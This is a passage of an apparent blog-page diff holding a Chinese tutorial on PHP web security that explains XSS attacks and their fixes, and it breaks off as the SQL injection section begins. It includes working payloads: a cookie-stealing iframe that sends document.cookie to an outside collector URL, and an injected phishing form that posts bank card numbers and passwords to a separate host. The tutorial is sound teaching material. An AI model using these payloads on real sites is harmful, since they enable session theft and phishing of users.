class="nav-text">eval相关问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E9%97%AE%E9%A2%98"><span class="nav-number">1.15.</span> <span class="nav-text">发送邮件问题</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="NI9NE"
+      src="/images/favicon/mstile-150x150.png">
+  <p class="site-author-name" itemprop="name">NI9NE</p>
+  <div class="site-description" itemprop="description">TECH OTAKU SAVE THE WORLD</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">99</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">53</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ni9ne" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ni9ne" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/ni9ne" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;ni9ne" rel="noopener" target="_blank"><i class="fab fa-git fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://unpkg.com/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://gitee.com/ni9ne" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ni9ne.github.io/2022/08/22/%E5%AE%89%E5%85%A8/PHP%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/favicon/mstile-150x150.png">
+      <meta itemprop="name" content="NI9NE">
+      <meta itemprop="description" content="TECH OTAKU SAVE THE WORLD">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NI9NE's Zone">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP编码安全及常见攻击
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-08-22 18:56:13" itemprop="dateCreated datePublished" datetime="2022-08-22T18:56:13+08:00">2022-08-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%BC%80%E5%8F%91%E8%B5%84%E6%96%99/" itemprop="url" rel="index"><span itemprop="name">开发资料</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="PHP编程安全"><a href="#PHP编程安全" class="headerlink" title="PHP编程安全"></a>PHP编程安全</h1><h2 id="Cookie简介"><a href="#Cookie简介" class="headerlink" title="Cookie简介"></a>Cookie简介</h2><p>HTTP是一种<strong>无状态协议</strong>, 即不对请求和响应之间的通信状态进行保存. 也就是说, 无法根据之前的状态关联本次的请求处理. 目的是更快的处理大量事务, 确保协议的可伸缩性</p>
+<p>为了解决这个问题, 引入<strong>Cookie</strong>. 客户端第一次访问服务时, 服务器生成Cookie, 通过响应发送给客户端, 并记录该Cookie对应的客户会话信息. 之后当客户端携带Cookie访问服务器时, 服务器就可以辨识本次请求的来源用户身份</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b1eb843bebdf74317d35b9d48641ce1-fc2d819.png" alt="image-20220908094428755"></p>
+<h2 id="Web安全总览"><a href="#Web安全总览" class="headerlink" title="Web安全总览"></a>Web安全总览</h2><p>Web攻击可分为<strong>主动攻击</strong>(Active Attack) 和 <strong>被动攻击</strong>(Passive Attack)</p>
+<h3 id="主动攻击"><a href="#主动攻击" class="headerlink" title="主动攻击"></a>主动攻击</h3><p>攻击者直接攻击Web服务器, 如SQL注入等</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5a4f1d6afddf1b00bbeb932b988eb3ec-73541a8.png" alt="image-20220908095458915"></p>
+<h3 id="被动攻击"><a href="#被动攻击" class="headerlink" title="被动攻击"></a>被动攻击</h3><p>攻击者不直接攻击服务器, 而是针对网站用户设下陷阱, 利用掉入陷阱的用户来获取修改用户数据或攻击应用程序</p>
+<ul>
+<li><p><strong>模式一 单纯被动攻击</strong></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/231f512a97705bc18fdefad67c6a1cf3-40aae6f.png" alt="image-20220908095818486"></p>
+<p>用户在浏览过所谓的“可疑网站”之后会感染上恶意软件。理论上如果浏览器（包括Adobe Flash Player等插件）不存漏洞，此类单纯的被动攻击是行不通的。但现实中，浏览器以及Adobe Reader、Adobe Flash Player、JRE 等插件的漏洞却层出不穷</p>
+</li>
+<li><p><strong>模式二 在正规网站中设置陷阱的被动攻击</strong></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b18347cab7175548a852fea3020196b8-fe0b8a0.png" alt="image-20220908100156321"></p>
+<p>攻击者示先入侵正规网站，往箕内容中嵌入恶意代码（①）。网站用户在浏览了含有恶意代码的内容后（②、③），就会感染病毒（④）。在这一流程中，单看步骤①的话似乎应归类为主动攻击，但步骤②、③均为被动攻击，因此可将①视作被动攻击的前期准备。</p>
+<table>
+<thead>
+<tr>
+<th align="center">设置陷阱</th>
+<th>手法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td>非法获取FTP等服务器密码后篡改网站内容</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td>通过攻击Web服务器的安全漏洞篡改网站内容</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td>通过SQL注入篡改网站内容</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td>在社交网络这类用户可以自己发布内容的网站, 利用跨站脚本漏洞实施攻击</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>模式三 跨站被动攻击</strong></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0c94125098751edd51f007d625fd14d7-7505744.png" alt="image-20220908100654086"></p>
+<p>此类攻击的特征为，恶意利用已经在正规网站登录的用户账号来实施攻击。由于步骤③的请求中要向正规网站发送会话Cookie，因此，如果用户己经在正规网站登录，就会利用其己经登经的状态实施攻击。</p>
+<p>此类攻击模式的典型案例包括，在步骤③的请求中对Web应用发动攻击的<strong>跨站请求伪造(CSRF)<strong>，以及在步骤④的响应中利用浏览器来执行攻击的</strong>跨站脚本攻击(XSS)<strong>和</strong>HTTP消息头注入攻击</strong>。</p>
+</li>
+</ul>
+<h3 id="浏览器防御被动攻击"><a href="#浏览器防御被动攻击" class="headerlink" title="浏览器防御被动攻击"></a>浏览器防御被动攻击</h3><p>针对被动攻击，浏览器和网站都需要采取相应的防御措施。如果浏览器存在安全问题，网站方面即使实施了对策也无法完全确保安全性。</p>
+<h4 id="浏览器安全功能一"><a href="#浏览器安全功能一" class="headerlink" title="浏览器安全功能一"></a>浏览器安全功能一</h4><p>浏览器能在用户浏览网站的同时运行一些程序，比如JavaScript、 Java Applet、Adobe Flash Player、 ActiveX等。而为了防止恶意程序在用户的浏览器上运行，JavaScript等语言提供了一些增强安全性的功能。基本思想有如下两种:</p>
+<ul>
+<li><strong>CA签名确认</strong> 只有在用户确认了程序的发行方并允许运行的情况下，程序才能被运行</li>
+<li><strong>Sandbox</strong> 提供限制程序权限的沙盒环境(禁止访问本地文件/禁止使用打印机/限制网络访问)</li>
+</ul>
+<h4 id="浏览器安全功能二"><a href="#浏览器安全功能二" class="headerlink" title="浏览器安全功能二"></a>浏览器安全功能二</h4><p><strong>同源策略</strong> - 协议、域名(指向主机)、端口，这三个完全相同的 URL 才能称之为同源</p>
+<p>如果同源, 在iframe外部就可以通过JS取得内部的HTML内容</p>
+<ul>
+<li><p><strong>同源</strong></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e5c7018912f2d264a4e741517f62fb6f-bc89a16.png" alt="image-20220908105931524"></p>
+</li>
+<li><p><strong>非同源</strong></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ae444459dddc7737b6fd57372544a3bd-cfebaf8.png" alt="image-20220908110234735"></p>
+</li>
+</ul>
+<h3 id="应用程序安全隐患"><a href="#应用程序安全隐患" class="headerlink" title="应用程序安全隐患"></a>应用程序安全隐患</h3><p>虽然浏览器的同源策略为抵御被动攻击设下了一道屏障，但如果应用程序中存在安全隐患，还是有可能遭受到被动攻击。跨站脚本攻击(XSS)就是典型的例子。</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bcfdfc16356c795428f24d58587fff1b-e9abeb0.png" alt="image-20220908112611999"></p>
+<h3 id="Web应用功能与安全隐患关系"><a href="#Web应用功能与安全隐患关系" class="headerlink" title="Web应用功能与安全隐患关系"></a>Web应用功能与安全隐患关系</h3><p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/06491573400c70b760d123855f2b0951-4019c91.png" alt="image-20220908112751743"></p>
+<p>Web应用可以使用 <strong>输入-处理-输出</strong> 模型表示, 从HTTP请求输入开始, 经过服务器应用的各种处理, 最后由HTTP响应进行输出. 而除了HTTP响应, 此处的输出还包括访问数据库、读写文件、收发邮件等与其他服务交流的操作</p>
+<table>
+<thead>
+<tr>
+<th>输出</th>
+<th>安全隐患</th>
+<th>恶意手段</th>
+<th>数据边界符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>输出HTML</td>
+<td>跨站脚本</td>
+<td>注入JavaScript等</td>
+<td><code>&lt;</code></td>
+</tr>
+<tr>
+<td>输出HTTP消息头</td>
+<td>HTTP消息头注入</td>
+<td>注入响应消息头</td>
+<td>换行符</td>
+</tr>
+<tr>
+<td>执行SQL语句</td>
+<td>SQL注入</td>
+<td>注入SQL命令</td>
+<td><code>&#39;</code></td>
+</tr>
+<tr>
+<td>调用Shell命令</td>
+<td>OS命令注入</td>
+<td>注入系统命令</td>
+<td><code>;</code></td>
+</tr>
+<tr>
+<td>输出邮件头和正文</td>
+<td>邮件头注入</td>
+<td>注入/修改邮件头或正文</td>
+<td>换行符</td>
+</tr>
+</tbody></table>
+<h2 id="页面显示相关问题"><a href="#页面显示相关问题" class="headerlink" title="页面显示相关问题"></a>页面显示相关问题</h2><h3 id="跨站脚本XSS"><a href="#跨站脚本XSS" class="headerlink" title="跨站脚本XSS"></a>跨站脚本XSS</h3><p>通常情况下, 在Web应用的网页中, 有些部分的<strong>显示内容会依据外界输入值而发生变化</strong>(会反弹恶意代码), 而如果生成这些HTML的程序中存在问题，就会滋生<strong>跨站脚本(Cross-Site Scripting)<strong>安全隐患. 由于和知名的CSS(层叠样式表)缩写冲突, 所以经常缩写为</strong>XSS</strong> </p>
+<p>Web应用若存XSS漏洞, 会有下列风险:</p>
+<ul>
+<li>用户的浏览器中运行攻击者的恶意脚本，从而导致Cookie信息被窃取，用户身份被冒名顶替</li>
+<li>攻击者能获得用户的权限来恶意使用Web应用的功能</li>
+<li>向用户显示伪造的输入表单，通过钓鱼式攻击(Phishing)窃取用户的个人信息</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生地点</td>
+<td>Web应用中生成HTML和JavaScript的位置</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>Web应用全体</td>
+</tr>
+<tr>
+<td>影响类型</td>
+<td>在网站用户的浏览器中执行JavaScript, 显示伪造的网站内容</td>
+</tr>
+<tr>
+<td>影响程度</td>
+<td>中 ~ 大</td>
+</tr>
+<tr>
+<td>用户参与程度</td>
+<td>需要: 浏览恶意网站、点击邮件附属链接、浏览已经被入侵的网站</td>
+</tr>
+<tr>
+<td>对策概要</td>
+<td>双引号括起属性值, 转义HTML中的特殊字符</td>
+</tr>
+</tbody></table>
+<h4 id="窃取Cookie"><a href="#窃取Cookie" class="headerlink" title="窃取Cookie"></a>窃取Cookie</h4><ul>
+<li><p>1.目标页面: 对用户输入没有做任何处理, 复现在页面上</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/73852fd699e8745eab4e9ed6e7052b5e-a581dcd.png" alt="image-20220908124242361"></p>
+</li>
+<li><p>2.输入简单的JavaScript注入</p>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; alert(<span class="built_in">document</span>.cookie) &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b88a194f1c00e444a2e181857f6b295c-ad70927.png" alt="image-20220908124549687"></p>
+</li>
+<li><p>3.构建钓鱼页面, 诱使用户点击</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f2408d519e6b0598afbbed974528cff9-bc0d1aa.png" alt="image-20220908140815830"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/test/WebSecure/cookie/search.php?item=&lt;script&gt;window.location=&#x27;http://ni9ne.com.cn/collectCookie.php?sid=&#x27;%2Bdocument.cookie;&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>4.查看结果</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9fe06249a4c3f49f740f5241159a76ce-bebfdd9.png" alt="image-20220908141430251"></p>
+</li>
+</ul>
+<h4 id="篡改网页"><a href="#篡改网页" class="headerlink" title="篡改网页"></a>篡改网页</h4><ul>
+<li><p>1.目标页面</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dda1006bebd359ef7d60210ffea107f3-2180dc8.png" alt="image-20220908171049197"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b8b7380fecd34839627c7e99d8fdad2-e6811c0.png" alt="image-20220908171109548"></p>
+</li>
+<li><p>2.构建钓鱼页面, 诱使用户点击</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f4abb263cbb83f3d632dd8ea05b1e7cd-ad0da87.png" alt="image-20220908171448002"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">	&quot;&gt;&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">	&lt;form style=&quot;top:5px;left:5px;position:absolute;z-index: 99;background-color: white;&quot; action=&quot;http://ni9ne.com.cn/phishing_order_res.php&quot; method=&quot;POST&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"> 	&lt;h1&gt;预约报名&lt;/h1&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"> 	姓名 &lt;input type=&quot;text&quot; name=&quot;name&quot; size=&quot;20&quot; value=&quot;ni9ne&quot;&gt;&lt;br&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"> 	地址 &lt;input type=&quot;text&quot; name=&quot;addr&quot; size=&quot;20&quot; value=&quot;佳园路111号&quot;&gt;&lt;br&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"> 	电话 &lt;input type=&quot;text&quot; name=&quot;tel&quot; size=&quot;20&quot; value=&quot;15988954253&quot;&gt;&lt;br&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"> 	银行卡号 &lt;input type=&quot;text&quot; name=&quot;card&quot; size=&quot;20&quot; value=&quot;xxxxxx&quot;&gt;&lt;br&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"> 	登陆密码 &lt;input type=&quot;text&quot; name=&quot;pwd&quot; size=&quot;20&quot; value=&quot;xxxxxx&quot;&gt;&lt;br&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"> 	&lt;input type=&quot;submit&quot; value=&quot;预约&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"> 	&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"> 	&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>3.用户点击, 查看结果</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dca607ff717a43a2a94bb15aa3b9ab28-0d72f5c.png" alt="image-20220908171859666"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/33800ebd86c306a90c6a2ae2f68f2403-a1265f1.png" alt="image-20220908172054985"></p>
+</li>
+</ul>
+<p><strong>攻击原理</strong>:</p>
+<p>恶意网页通过下列手段隐藏原来的form并添加新的form, 从而改变页面</p>
+<p>1.使用 <code>&quot;&gt;&lt;/form&gt;</code> 闭合原有form元素</p>
+<p>2.添加新的form元素, 并通过指定样式方式赢藏原有form</p>
+<ul>
+<li><p>通过固定绝对坐标方式将form固定</p>
+</li>
+<li><p>将<code>z-index</code> 设置为最大值, 确保悬浮在原有form上方</p>
+</li>
+<li><p>将背景指定为网站整体背景色, 隐藏原有form</p>
+</li>
+</ul>
+<p>3.在新的form中指定提交目标为恶意网站</p>
+<h4 id="href-src属性XSS"><a href="#href-src属性XSS" class="headerlink" title="href/src属性XSS"></a>href/src属性XSS</h4><p>有些元素的属性值为URL, 如 <code>a</code> 元素的 <code>href</code> 属性, <code>img</code> 、<code>frame</code> 、<code>iframe</code> 元素的 <code>src</code> 属性. 如果属性值中的URL是由外界传入, 就可能通过使用 <code>javascript: js代码</code> 形式的URL执行JavaScript代码. </p>
+<ul>
+<li><p>1.目标页面</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/daeccb79ee0b5bde3f46f97222071318-16f97e5.png" alt="image-20220908181539429"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d79d85c52814b41c936fd3166afc7088-b7b0265.png" alt="image-20220908181738586"></p>
+</li>
+<li><p>输入js代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="built_in">document</span>.cookie)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8c94882ee92d3c129313650a4024415d-87a7746.png" alt="image-20220908182004565"></p>
+</li>
+</ul>
+<p><strong>对策</strong>:</p>
+<p>URL由程序动态生成时, 需要对其进行校验, 仅允许 http 和 https协议. 此外, 通过校验的URL还需要作为属性值进行HTML转义. 即URL属性必须满足两个条件中的一个:</p>
+<ul>
+<li>以 <code>http:</code> 或 <code>https:</code> 开头的绝对URL</li>
+<li>以 <code>/</code> 开头的相对URL</li>
+</ul>
+<h4 id="JavaScript的动态生成"><a href="#JavaScript的动态生成" class="headerlink" title="JavaScript的动态生成"></a>JavaScript的动态生成</h4><p>Web应用中, 服务器依据客户输入动态生成一部分JavaScript. 可能存在js注入风险</p>
+<ul>
+<li><p>1.目标页面</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/318dd6c2c614ccacda91cd24903c5879-7fbb498.png" alt="image-20220908183951550"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bae27fc34c07da5071be9c8a26b1e2da-ef7ff12.png" alt="image-20220908184057779"></p>
+</li>
+<li><p>输入JS代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);alert(document.cookie)//</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/960c3dd4af25438caec235bdac842896-deb7ac0.png" alt="image-20220908184224255"></p>
+<p>实际页面变为:</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a795e0d4a8d02b584b41049bf33d930e-d99973b.png" alt="image-20220908184424050"></p>
+</li>
+</ul>
+<p><strong>对策</strong>:</p>
+<p>需要对JavaScript字符串进行转义, 避免单引号 <code>&#39;</code> 被作为结束边界符</p>
+<ul>
+<li>将数据作为js字符串进行转义</li>
+<li>将得到的结果再次进行html实体化</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>原字符</th>
+<th>JavaScript转义后</th>
+<th>HTML实体化后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;</code>  <code>&gt;</code>  <code>&#39;</code>  <code>&quot;</code>  <code>\</code></td>
+<td><code>&lt;</code>  <code>&gt;</code>  <code>\&#39;</code>  <code>\&quot;</code>  <code>\\</code></td>
+<td><code>&amp;lt;</code>  <code>&amp;gt;</code>  <code>\&amp;#39;</code>  <code>\&amp;quot;</code>  <code>\\</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>或直接使用Unicode转义, 将字母数字之外的字符转为Unicode</p>
+</blockquote>
+<h3 id="错误报告导致信息泄露"><a href="#错误报告导致信息泄露" class="headerlink" title="错误报告导致信息泄露"></a>错误报告导致信息泄露</h3><p>错误信息泄露存在以下两种状况:</p>
+<ul>
+<li>错误信息中含有对攻击者有帮助的应用程序内部信息</li>
+<li>通过蓄意攻击使错误信息中显示隐私信息(如用户名/密码等)</li>
+</ul>
+<p>PHP可以配置关闭错误显示</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php.ini</span></span><br><span class="line"><span class="attr">display_errors</span> = <span class="string">Off</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="页面显示相关问题解决方案"><a href="#页面显示相关问题解决方案" class="headerlink" title="页面显示相关问题解决方案"></a>页面显示相关问题解决方案</h2><h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><p>XSS主要分为<strong>反射型XSS</strong>和<strong>存储型XSS</strong> </p>
+<ul>
+<li><p>反射型XSS(Reflected XSS)</p>
+<p>攻击用的JS代码位于攻击目标网站之外的其他网站(恶意网站或邮件中的URL)</p>
+<p>如窃取Cookie中使用的用户输入值确认页面</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/98982edad9d258e8a6a9b88101f2f50f-b9b1923.png" alt="image-20220908173455951"></p>
+</li>
+<li><p>存储型XSS (Stored XSS)</p>
+<p>也叫持久性XSS(Presistent XSS), 攻击用JS代码保存在攻击对象服务器上</p>
+<p>典型攻击对象为Web邮箱客户端及社交网站发布页</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1918ea18397b8b65c234a533029a1caf-d661208.png" alt="image-20220908173536032"></p>
+</li>
+</ul>
+<h3 id="XSS产生根源"><a href="#XSS产生根源" class="headerlink" title="XSS产生根源"></a>XSS产生根源</h3><p>根本原因是在生产HTML过程中, HTML语法中的关键字(元字符)没有被正确处理, 导致HTML/JS被注入, 从而导致原有页面结构变化.</p>
+<p>为了消除关键字的特殊意义, 将其转化为普通字符, 就需要进行转义/实体化处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">转义规则: http://www.w3chtml.com/html/character.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>参数所在位置转义方式:</p>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>说明</th>
+<th>最低限度转义内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>元素内容</td>
+<td>1.能解释Tag和字符实体<br />2.结束边界字符为 <code>&lt;</code></td>
+<td><code>&lt;</code>  <code>&amp;</code></td>
+</tr>
+<tr>
+<td>属性值</td>
+<td>1.能解释字符实体<br />2.结束边界字符为双引号 <code>&quot;</code></td>
+<td>属性值用双引号括起来, <code>&lt;</code>  <code>&amp;</code>  <code>&quot;</code></td>
+</tr>
+<tr>
+<td>属性值(URL)</td>
+<td>同上</td>
+<td>校验URL格式正确后按属性值规则转义</td>
+</tr>
+<tr>
+<td>事件绑定函数</td>
+<td>同上</td>
+<td>转义JavaScript后按属性值规则转义</td>
+</tr>
+<tr>
+<td>Script元素中的字符串</td>
+<td>不能解释Tag和字符实体<br />结束边界字符为<code>&lt;/</code></td>
+<td>转义JavaScript并避免出现 <code>&lt;/</code></td>
+</tr>
+</tbody></table>
+<ul>
+<li><p>PHP中一般使用 <code>htmlspecialchars($string, $quote_style, $charset)</code> 函数进行实体化转义, 如:</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> htmlspecialchars(<span class="variable">$value</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>输入校验, 通过校验用户输入值的有效性, 防御XSS攻击</p>
+</li>
+<li><p>给Cookie添加<code>HttpOnly</code>属性, 禁止 JavaScript 读取Cookie信息</p>
+  <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php.ini</span></span><br><span class="line"><span class="meta">session.cookie_httponly</span> = <span class="string">1</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="SQL调用相关问题"><a href="#SQL调用相关问题" class="headerlink" title="SQL调用相关问题"></a>SQL调用相关问题</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>SQL注入漏洞是由于SQL语句的调用方法不完善而产生的安全隐患. 导致的结果一般是直接对服务器的攻击, 而不需要用户的参与, 可能造成以下影响:</p>
+<ul>
